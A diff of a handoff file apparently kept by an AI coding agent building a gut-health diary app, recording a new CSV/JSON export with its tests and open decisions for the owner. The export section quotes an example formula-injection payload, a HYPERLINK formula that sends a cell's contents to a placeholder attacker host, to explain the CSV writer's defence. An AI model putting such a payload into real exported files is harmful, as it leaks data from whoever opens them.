@@ -4,7 +4,7 @@
 He is unavailable until morning. This file is the handoff between loop iterations — read it
 first, act, then update it last.
 
-Last updated: **2026-09-06, loop 25** · Update the date and loop number every
+Last updated: **2026-09-06, loop 26** · Update the date and loop number every
 time you touch this file.
 
 ---
@@ -41,9 +41,9 @@ owner and work on something else.
 
 |                   |                                                                  |
 | ----------------- | ---------------------------------------------------------------- |
-| Current branch    | `feat/m6-timeline` — 60 commits ahead of `main`, pushed          |
+| Current branch    | `feat/m6-timeline` — 62 commits ahead of `main`, pushed          |
 | `main`            | `22d2aa2` — Milestone 5 complete. **Untouched by design.**       |
-| Tests             | **984 passing**, 60 suites                                       |
+| Tests             | **1023 passing**, 62 suites                                      |
 | `npx expo-doctor` | **21/21**                                                        |
 | iOS bundle        | builds (`npx expo export --platform ios`)                        |
 | Live database     | ⚠️ **PAUSED (INACTIVE)** — see §7. 11 tables when last reachable |
@@ -195,7 +195,49 @@ The only outstanding piece is the findings repository, which is blocked on the p
 (§7). Experiments (M11), Ask My Gut (M10), subscriptions (M12) and HealthKit (M13) all need
 something the owner must provide first, so the next unblocked milestone is **M16**.
 
-### Now: Milestone 16 — privacy and security hardening
+### Now: Milestone 15 — reports and export
+
+M16's analytics, monitoring, secret-scan and dependency-audit work is done; what remains of it
+needs the paused database or a DSN (listed at the end of this section). M15 is fully unblocked.
+
+**Done in loop 26:**
+
+- `domain/export/csv.ts` + 18 tests — a CSV writer that handles **two** problems. Escaping is the
+  familiar one. **Formula injection** is the one that matters: a cell starting with `=`, `+`, `-`,
+  `@`, tab or CR is executed by Excel, Numbers and Sheets, so a note reading
+  `=HYPERLINK("https://evil.example/"&A1,"click")` becomes a live link the moment the file opens.
+  Prefixing with an apostrophe neutralises it and leaves the cell readable. This matters because
+  the export is meant to be handed to a clinician — it is exactly the file someone forwards.
+- `domain/export/exportDiary.ts` + 21 tests — `buildDiaryExport(logs, meta)` returns the files to
+  write: one lossless JSON document plus one CSV per log type.
+  **JSON keeps every field**, including the ones no screen shows (source, timezone, offset,
+  created/updated). **Timestamps appear twice throughout** — the instant, and what the person's own
+  clock said — because §16 means a day boundary cannot be rebuilt from UTC alone.
+  Deleted entries are excluded; an empty log type still gets a file with its header, because a
+  missing file reads as "the export failed". Pure: the caller supplies `generatedAt`, so an export
+  of an unchanged diary is byte-identical.
+
+**Pick up here:**
+
+1. **Wire export to a screen and a share sheet.** The builders are pure and done; what is missing
+   is the edge. `expo-sharing` is **not** currently a dependency — check `CLAUDE.md` §38 before
+   adding it, and note that `expo-file-system` writes the files either way. The You tab already
+   says "You will always be able to export everything you have logged", so this is a promise
+   already made to the user.
+   Real states are needed: a diary of several thousand entries takes a moment to serialise, and a
+   share sheet the user dismisses is not an error.
+2. **The PDF / appointment report** (spec §98, and the reason M15 exists). `expo-print` is already
+   approved in `docs/PROJECT_PLAN.md`, so no dependency decision is needed — it renders HTML to
+   PDF. The hard part is not the rendering, it is the **content**: a report handed to a clinician
+   must not overstate. Everything in `docs/PATTERN_ENGINE.md` and `CLAUDE.md` §17 applies with more
+   force here than anywhere else in the app, because this is the artefact that leaves the app and
+   gets read by someone who did not see the caveats on screen.
+   `domain/patterns/findingDetail.ts` already turns a finding into safe sentences — reuse it rather
+   than writing a second vocabulary.
+3. **CSV/JSON export is not yet reachable by a user.** Until item 1 lands, the feature exists only
+   in tests. That is worth saying plainly in any progress summary.
+
+### Milestone 16 — privacy and security hardening. **The unblocked parts are complete.**
 
 Most of M16 is an audit needing the live database or credentials that do not exist yet. What has
 been buildable is the part that has to exist **before** anything depends on it.
@@ -311,11 +353,10 @@ each status means and what it does not.
 
 ### After that, in order
 
-1. **M15** — Reports and export. Fully unblocked: `loadLogSet` already reads the whole diary, and
-   `expo-print` (HTML→PDF) is already approved in `docs/PROJECT_PLAN.md`, so it needs no new
-   dependency decision.
-2. **M11** — Experiments. Needs M8, which is done. Also the milestone that unblocks the second
+1. **M11** — Experiments. Needs M8, which is done. Also the milestone that unblocks the second
    half of `nextStep()` on the pattern detail page.
+2. **The blocked halves of M15 and M16**, once the owner acts: account deletion needs the database
+   for its server cascade, and the Sentry SDK needs a DSN.
 
 M10 (Ask My Gut) and M7 need an AI provider. M12 needs RevenueCat. M13 needs HealthKit on a
 device. All blocked on the owner. M9 and M16 are the current and previous milestones above.
@@ -374,34 +415,35 @@ Follow `CLAUDE.md` §50. Concretely, each loop:
 
 Append one line per loop. Keep it short and factual.
 
-| Loop | What changed                                                                                            | Verification                           |
-| ---- | ------------------------------------------------------------------------------------------------------- | -------------------------------------- |
-| 0    | Hand-off written. M6 pushed to `feat/m6-timeline`. Bundle id `com.vivaan.gutsignal` and Apple team set. | 357 tests, doctor 21/21, bundle builds |
-| 1    | M8 started: pattern-engine `types.ts` (vocabulary) and `windows.ts` + 13 tests.                         | 370 tests, verify green                |
-| 2    | `observations.ts` + 28 tests — the §59 missing-data rules, outcome-specific observability.              | 398 tests, verify green                |
-| 3    | `factors.ts` (thresholded context factors) and `exposures.ts` + 19 tests — candidate selection.         | 417 tests, verify green                |
-| 4    | `comparisons.ts` + 28 tests — counts, rates, severity, Newcombe interval, weekly consistency.           | 445 tests, verify green                |
-| 5    | `confidence.ts` + `scoring.ts` + 23 tests — weakest-link confidence, count-gated status.                | 468 tests, verify green                |
-| 6    | `confounders.ts` + 14 tests — imbalance-based entanglement, not similarity.                             | 482 tests, verify green                |
-| 7    | `engine.ts` + 16 tests — `analyse()` joins the whole pass; deterministic end to end.                    | 498 tests, verify green                |
-| 8    | `multiple-testing.ts` + 19 tests — breadth shrinkage, wired into `analyse()`.                           | 517 tests, verify green                |
-| 9    | `fixtures/` + 38 tests — all 15 §42 scenarios. Caught and fixed same-measurement confounding.           | 555 tests, verify green                |
-| 10   | `docs/PATTERN_ENGINE.md` + 44 tests pinning it to the code. **Milestone 8 complete.**                   | 599 tests, verify green                |
-| 11   | M9 started: `logSetRepository` + 14 tests. Findings migration written but **unapplied — DB paused**.    | 613 tests, verify green                |
-| 12   | `insights.ts` + 24 tests — section selection, and honest copy for five kinds of silence.                | 637 tests, verify green                |
-| 13   | `buildInsights` + `useInsights` + `FindingCard` + `outcomeLabels`. **Insights screen is real.**         | 662 tests, verify green, bundle builds |
-| 14   | `findingDetail` + **pattern detail screen** (§51), wired from Insights. Route-registration test added.  | 710 tests, verify green, bundle builds |
-| 15   | `gutMap` + **Gut Map section** (§52) — every factor examined, including the ones that came to nothing.  | 734 tests, verify green, bundle builds |
-| 16   | `trends` + `TrendChart` (§49) — bars not lines, gaps left empty. **Milestone 9 complete.**              | 759 tests, verify green, bundle builds |
-| 17   | M16 started: the analytics allowlist (§29/T5) and a secret scan, both built before anything needs them. | 850 tests, verify green, bundle builds |
-| 18   | Every log write, edit, deletion and sign-in now reports. `track` forbidden in `src/domain`, by test.    | 867 tests, verify green, bundle builds |
-| 19   | Another account's local data is cleared when someone else signs in — a §58 cross-user hole, closed.     | 885 tests, verify green, bundle builds |
-| 20   | Sign-out flushes, counts and warns before discarding anything unsent (§15). §4 tidied of loop drift.    | 899 tests, verify green, bundle builds |
-| 21   | `useScreenView` — once per focus, waits for its data. Wired to 4 events. Lint now 0 errors, 0 warnings. | 906 tests, verify green, bundle builds |
-| 22   | `sync_failed` classified into four safe words, never a message; onboarding funnel from one frame.       | 937 tests, verify green, bundle builds |
-| 23   | The last four events: log sheet open/dismiss and timeline search/filter. Every event now has a caller.  | 955 tests, verify green, bundle builds |
-| 24   | Crash-report scrubber (§30): allowlisted fields, redacted text, and honest about which is which.        | 984 tests, verify green, bundle builds |
-| 25   | Dependency audit (14 moderate, no fix — ADR-0039), PRIVACY_SECURITY.md, pattern_findings RLS cover.     | 984 tests, verify green                |
+| Loop | What changed                                                                                            | Verification                            |
+| ---- | ------------------------------------------------------------------------------------------------------- | --------------------------------------- |
+| 0    | Hand-off written. M6 pushed to `feat/m6-timeline`. Bundle id `com.vivaan.gutsignal` and Apple team set. | 357 tests, doctor 21/21, bundle builds  |
+| 1    | M8 started: pattern-engine `types.ts` (vocabulary) and `windows.ts` + 13 tests.                         | 370 tests, verify green                 |
+| 2    | `observations.ts` + 28 tests — the §59 missing-data rules, outcome-specific observability.              | 398 tests, verify green                 |
+| 3    | `factors.ts` (thresholded context factors) and `exposures.ts` + 19 tests — candidate selection.         | 417 tests, verify green                 |
+| 4    | `comparisons.ts` + 28 tests — counts, rates, severity, Newcombe interval, weekly consistency.           | 445 tests, verify green                 |
+| 5    | `confidence.ts` + `scoring.ts` + 23 tests — weakest-link confidence, count-gated status.                | 468 tests, verify green                 |
+| 6    | `confounders.ts` + 14 tests — imbalance-based entanglement, not similarity.                             | 482 tests, verify green                 |
+| 7    | `engine.ts` + 16 tests — `analyse()` joins the whole pass; deterministic end to end.                    | 498 tests, verify green                 |
+| 8    | `multiple-testing.ts` + 19 tests — breadth shrinkage, wired into `analyse()`.                           | 517 tests, verify green                 |
+| 9    | `fixtures/` + 38 tests — all 15 §42 scenarios. Caught and fixed same-measurement confounding.           | 555 tests, verify green                 |
+| 10   | `docs/PATTERN_ENGINE.md` + 44 tests pinning it to the code. **Milestone 8 complete.**                   | 599 tests, verify green                 |
+| 11   | M9 started: `logSetRepository` + 14 tests. Findings migration written but **unapplied — DB paused**.    | 613 tests, verify green                 |
+| 12   | `insights.ts` + 24 tests — section selection, and honest copy for five kinds of silence.                | 637 tests, verify green                 |
+| 13   | `buildInsights` + `useInsights` + `FindingCard` + `outcomeLabels`. **Insights screen is real.**         | 662 tests, verify green, bundle builds  |
+| 14   | `findingDetail` + **pattern detail screen** (§51), wired from Insights. Route-registration test added.  | 710 tests, verify green, bundle builds  |
+| 15   | `gutMap` + **Gut Map section** (§52) — every factor examined, including the ones that came to nothing.  | 734 tests, verify green, bundle builds  |
+| 16   | `trends` + `TrendChart` (§49) — bars not lines, gaps left empty. **Milestone 9 complete.**              | 759 tests, verify green, bundle builds  |
+| 17   | M16 started: the analytics allowlist (§29/T5) and a secret scan, both built before anything needs them. | 850 tests, verify green, bundle builds  |
+| 18   | Every log write, edit, deletion and sign-in now reports. `track` forbidden in `src/domain`, by test.    | 867 tests, verify green, bundle builds  |
+| 19   | Another account's local data is cleared when someone else signs in — a §58 cross-user hole, closed.     | 885 tests, verify green, bundle builds  |
+| 20   | Sign-out flushes, counts and warns before discarding anything unsent (§15). §4 tidied of loop drift.    | 899 tests, verify green, bundle builds  |
+| 21   | `useScreenView` — once per focus, waits for its data. Wired to 4 events. Lint now 0 errors, 0 warnings. | 906 tests, verify green, bundle builds  |
+| 22   | `sync_failed` classified into four safe words, never a message; onboarding funnel from one frame.       | 937 tests, verify green, bundle builds  |
+| 23   | The last four events: log sheet open/dismiss and timeline search/filter. Every event now has a caller.  | 955 tests, verify green, bundle builds  |
+| 24   | Crash-report scrubber (§30): allowlisted fields, redacted text, and honest about which is which.        | 984 tests, verify green, bundle builds  |
+| 25   | Dependency audit (14 moderate, no fix — ADR-0039), PRIVACY_SECURITY.md, pattern_findings RLS cover.     | 984 tests, verify green                 |
+| 26   | M15 started: diary export as lossless JSON and per-type CSV, safe against spreadsheet formulas.         | 1023 tests, verify green, bundle builds |
 
 ---
 
@@ -496,6 +538,17 @@ One consequence worth knowing: sign-out now waits on the network before showing 
 so on a bad connection the button spins for as long as a sync attempt takes. It is the only place
 in the app that waits on the network at all, and it does so because it is the last moment the
 person whose entries these are is still present.
+
+#### 🟡 Export exists but nobody can reach it yet
+
+The diary export is built and tested — lossless JSON plus a CSV per log type — but it is not wired
+to a screen, so today it exists only in tests. The You tab already tells the user "You will always
+be able to export everything you have logged", so the promise is out there ahead of the button.
+
+One decision waiting for you: sharing the files needs `expo-sharing`, which is **not** currently a
+dependency. `CLAUDE.md` §38 says a new dependency is your call, not mine, so I did not add it. If
+you would rather avoid it, the alternative is writing the files with `expo-file-system` and
+surfacing them through the Files app, which is clunkier but adds nothing to the tree.
 
 #### 🟢 Two moderate advisories are accepted, on purpose
 
